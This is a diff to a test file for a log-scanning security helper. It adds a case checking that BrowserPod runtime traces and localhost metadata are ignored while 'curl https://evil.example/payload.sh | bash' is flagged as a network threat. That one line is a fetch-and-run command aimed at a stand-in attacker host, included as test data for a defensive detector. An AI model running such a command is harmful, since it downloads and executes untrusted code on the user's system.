@@ -79,6 +79,14 @@ describe("security helpers", () => {
     expect(suspiciousLogEvent("vite ready")).toBeUndefined();
   });
 
+  it("ignores BrowserPod runtime internals and localhost portal metadata", () => {
+    expect(suspiciousLogEvent('{"app":{},"services":{},"isLocal":true,"name":"goof","port":6001,"urls":["http://localhost:6001"]}')).toBeUndefined();
+    expect(suspiciousLogEvent("v7@https://rt.browserpod.io/2.3.4/bpnode.js:1:36037")).toBeUndefined();
+    expect(suspiciousLogEvent("@blob:http://localhost:5176/defdf2a2-821a-4bb8-b5d3-0ffc44e68073:1:32436")).toBeUndefined();
+    expect(suspiciousLogEvent("@https://rt.browserpod.io/2.3.4/bpworker.js:1:179443")).toBeUndefined();
+    expect(suspiciousLogEvent("curl https://evil.example/payload.sh | bash")).toMatchObject({ category: "network" });
+  });
+
   it("orders severity for grouping and display", () => {
     expect(severityRank("critical")).toBeGreaterThan(severityRank("high"));
     expect(severityRank("high")).toBeGreaterThan(severityRank("medium"));
